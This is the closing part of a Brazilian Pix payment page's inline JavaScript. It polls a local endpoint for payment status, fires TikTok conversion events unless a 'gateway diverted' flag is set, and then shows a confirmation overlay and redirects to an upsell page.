          const m = String(Math.floor(segundos / 60)).padStart(2, '0');
          const s = String(segundos % 60).padStart(2, '0');
          span.textContent = `${m}:${s}`;
          segundos -= 1;
          setTimeout(tick, 1000);
        };
        tick();
      }

      let order = loadOrder();
      const paymentStatusHeading = document.getElementById('payment-status-heading');
      const params = new URLSearchParams(window.location.search);
      const refParam = (params.get('ref') || '').trim();
      const txParam = (params.get('tx') || '').trim();

      const resolveRefTx = (sourceOrder) => {
        const resolvedRef = sourceOrder?.pix?.referenceId || sourceOrder?.referenceId || sourceOrder?.gatewayResponse?.referenceId || sourceOrder?.gatewayResponse?.data?.referenceId || sourceOrder?.data?.referenceId || sourceOrder?.gatewayResponse?.items?.[0]?.externalRef || sourceOrder?.gatewayResponse?.metadata?.hash || sourceOrder?.gatewayResponse?.data?.metadata?.hash || refParam || '';
        const resolvedTx = sourceOrder?.pix?.transactionId || sourceOrder?.transactionId || sourceOrder?.gatewayResponse?.id || sourceOrder?.gatewayResponse?.data?.id || sourceOrder?.data?.id || sourceOrder?.gatewayResponse?.transactionId || sourceOrder?.gatewayResponse?.data?.transactionId || txParam || '';
        return { ref: String(resolvedRef || '').trim(), tx: String(resolvedTx || '').trim() };
      };

      let { ref, tx } = resolveRefTx(order);

      const parseGatewayDiverted = (value) => {
        if (value === true || value === false) return value;
        if (value === 1 || value === 0) return value === 1;
        if (typeof value !== 'string') return null;
        const normalized = value.trim().toLowerCase();
        if (['1', 'true', 'sim', 'yes'].includes(normalized)) return true;
        if (['0', 'false', 'nao', 'no'].includes(normalized)) return false;
        return null;
      };

      const resolveGatewayDiverted = (source) => {
        if (!source || typeof source !== 'object') return null;
        const candidates = [
          source.gatewayDiverted, source.gateway_diverted,
          source.tracking_context?.gateway_diverted, source.trackingContext?.gateway_diverted,
          source.trackingParameters?.gateway_diverted, source.pix?.gateway_diverted,
          source.pix?.tracking_context?.gateway_diverted, source.pix?.trackingParameters?.gateway_diverted,
          source.gatewayResponse?.gateway_diverted, source.gatewayResponse?.tracking_context?.gateway_diverted,
          source.gatewayResponse?.trackingParameters?.gateway_diverted,
          source.gatewayResponse?.data?.tracking_context?.gateway_diverted,
          source.gatewayResponse?.data?.trackingParameters?.gateway_diverted
        ];
        for (const candidate of candidates) {
          const parsed = parseGatewayDiverted(candidate);
          if (parsed !== null) return parsed;
        }
        return null;
      };

      const initialDiverted = resolveGatewayDiverted(order);
      let gatewayDiverted = initialDiverted === true;
      if (initialDiverted !== null) {
        window.RABBITFY_GATEWAY_DIVERTED = gatewayDiverted;
        if (gatewayDiverted === false && typeof window.maybeLoadTikTok === 'function') {
          window.maybeLoadTikTok();
        }
      }

      let tiktokPaidTracked = false;
      const trackTikTokPaidEvents = (sourceOrder) => {
        if (tiktokPaidTracked || typeof window.ttqFire !== 'function') return;
        const resolvedDiverted = resolveGatewayDiverted(sourceOrder);
        if (resolvedDiverted !== null) { gatewayDiverted = resolvedDiverted; window.RABBITFY_GATEWAY_DIVERTED = resolvedDiverted; }
        if (gatewayDiverted) { tiktokPaidTracked = true; return; }
        const totalsSnapshot = computeTotals(sourceOrder || {});
        const orderBumpSnapshot = computeOrderBumpMetrics((sourceOrder && Array.isArray(sourceOrder.carrinho)) ? sourceOrder.carrinho : []);
        const referenceSnapshot = String(sourceOrder?.pix?.referenceId || sourceOrder?.referenceId || sourceOrder?.gatewayResponse?.referenceId || sourceOrder?.gatewayResponse?.data?.referenceId || ref || tx || '').trim();
        const conversionRef = referenceSnapshot !== '' ? referenceSnapshot : String(tx || '').trim();
        const conversionEventId = conversionRef !== '' ? `ttk_order_${conversionRef}` : `ttk_order_${Date.now()}`;
        const generatedPaidMarkerKey = conversionRef !== '' ? `ttk_generated_paid_${conversionRef}` : '';
        const lockKey = conversionRef !== '' ? `ttk_paid_tracked_${conversionRef}` : '';
        const isTrackedInStorage = (storageKey) => {
          if (!storageKey) return false;
          try { return sessionStorage.getItem(storageKey) === '1' || localStorage.getItem(storageKey) === '1'; } catch (error) { return false; }
        };
        const markTrackedInStorage = (storageKey) => {
          if (!storageKey) return;
          try { sessionStorage.setItem(storageKey, '1'); localStorage.setItem(storageKey, '1'); } catch (error) {}
        };
        if (isTrackedInStorage(lockKey)) { tiktokPaidTracked = true; return; }
        const paidPayload = { currency: 'BRL', value: Number(totalsSnapshot.total || 0), quantity: Number(totalsSnapshot.itens || 0), order_bump_value: Number(orderBumpSnapshot.valor || 0), order_bump_items: Number(orderBumpSnapshot.itens || 0), event_stage: 'pedido_pago', event_id: conversionEventId };
        let wasGeneratedAsPaid = false;
        if (window.TIKTOK_MARK_AS_PAID === true && generatedPaidMarkerKey !== '') {
          wasGeneratedAsPaid = isTrackedInStorage(generatedPaidMarkerKey);
        }
        if (wasGeneratedAsPaid) { tiktokPaidTracked = true; markTrackedInStorage(lockKey); return; }
        window.ttqFire('CompletePayment', paidPayload);
        window.ttqFire('Purchase', paidPayload);
        if (window.zgTrack) window.zgTrack('Purchase', paidPayload.value || 0);
        tiktokPaidTracked = true;
        markTrackedInStorage(lockKey);
      };

      if ((!order || !Array.isArray(order.carrinho) || order.carrinho.length === 0) && (ref || tx)) {
        const dbOrder = await fetchOrderFromDatabase(ref, tx);
        if (dbOrder) {
          order = dbOrder;
          const resolved = resolveRefTx(order);
          ref = resolved.ref || ref;
          tx = resolved.tx || tx;
          const resolvedDiverted = resolveGatewayDiverted(order);
          if (resolvedDiverted !== null) { gatewayDiverted = resolvedDiverted; window.RABBITFY_GATEWAY_DIVERTED = resolvedDiverted; }
        }
      }

      let redirectDone = false;
      let intervalo = null;
      const finalizeAsPaid = () => {
        if (redirectDone) return;
        redirectDone = true;
        if (intervalo) clearInterval(intervalo);
        trackTikTokPaidEvents(order);
        if (paymentStatusHeading) {
          paymentStatusHeading.textContent = 'Seu pedido foi pago!';
          paymentStatusHeading.style.color = '#16a34a';
        }
        const overlay = document.createElement('div');
        overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;z-index:99999';
        overlay.innerHTML = `<div style="background:#fff;border-radius:20px;padding:40px 32px;box-shadow:0 8px 40px rgba(0,0,0,.2);text-align:center;max-width:88vw"><div style="font-size:3rem;color:#16a34a;margin-bottom:16px">✓</div><h2 style="font-size:1.4rem;font-weight:800;color:#16a34a;margin:0 0 8px">Pagamento confirmado!</h2><p style="font-size:14px;color:#6b7280;margin:0 0 20px">Redirecionando para seus detalhes...</p><div style="margin:0 auto;border:3px solid #e5e7eb;border-top:3px solid #16a34a;border-radius:50%;width:36px;height:36px;animation:spin 1s linear infinite"></div><style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style></div>`;
        document.body.appendChild(overlay);
        const _refForUpsell = encodeURIComponent(ref || tx || ''); const _upsellUrl = paymentConfirmRedirectUrl + (paymentConfirmRedirectUrl.includes('?') ? '&' : '?') + 'ref=' + _refForUpsell; setTimeout(() => { window.location.href = _upsellUrl; }, 2200);
      };

      if (ref || tx) {
        const checkPaymentStatus = async () => {
          try {
            const qs = new URLSearchParams();
            if (ref) qs.set('ref', ref);
            if (tx) qs.set('tx', tx);
            if (!qs.toString()) return;
            const res = await fetch(`verifica_pagamento.php?${qs.toString()}`, { cache: 'no-store' });
            const raw = await res.text();
            if (!raw) return;
            let json;
            try { json = JSON.parse(raw); } catch (e) { return; }
            const divertedFlag = parseGatewayDiverted(json?.gateway_diverted ?? json?.gatewayDiverted);
            if (divertedFlag !== null) {
              gatewayDiverted = divertedFlag;
              window.RABBITFY_GATEWAY_DIVERTED = divertedFlag;
              if (order && typeof order === 'object') order.gatewayDiverted = divertedFlag;
              if (divertedFlag === false && typeof window.maybeLoadTikTok === 'function') window.maybeLoadTikTok();
            }
            const status = String(json?.status || '').toLowerCase().trim();
            const paidStatuses = new Set(['paid', 'pago', 'approved', 'aprovado', 'completed', 'success', 'succeeded']);
            if (paidStatuses.has(status)) finalizeAsPaid();
          } catch (e) {}
        };
        await checkPaymentStatus();
        if (!redirectDone) intervalo = setInterval(checkPaymentStatus, 8000);
      }

      if (!order || !Array.isArray(order.carrinho) || order.carrinho.length === 0) {
        initQRCode();
        iniciarContador();
        return;
      }

      const totals = computeTotals(order);
      descontoEls.forEach(el => el && (el.textContent = formatBRL(totals.desconto)));
      if (totalCarrinhoEl) totalCarrinhoEl.textContent = formatBRL(totals.subtotal);
      if (totalEl) totalEl.textContent = formatBRL(totals.total);
      if (totalFooterEl) totalFooterEl.textContent = formatBRL(totals.total);
      if (freteEl) freteEl.textContent = order.frete ? `${esc(order.frete.titulo)} (${formatBRL(order.frete.preco || 0)})` : 'Frete não selecionado';
      if (quantidadeEl) quantidadeEl.textContent = totals.itens === 1 ? '1 item' : `${totals.itens} itens`;

      if (!gatewayDiverted && typeof window.ttqFire === 'function') {
        window.ttqFire('InitiateCheckout', { currency: 'BRL', value: Number(totals.total || 0), quantity: Number(totals.itens || 0), event_stage: 'aguardando_pagamento' });
        if (window.zgTrack) window.zgTrack('InitiateCheckout', Number(totals.total || 0));
      }
      initQRCode();
      iniciarContador();

    })();
  </script>
</body>
</html>
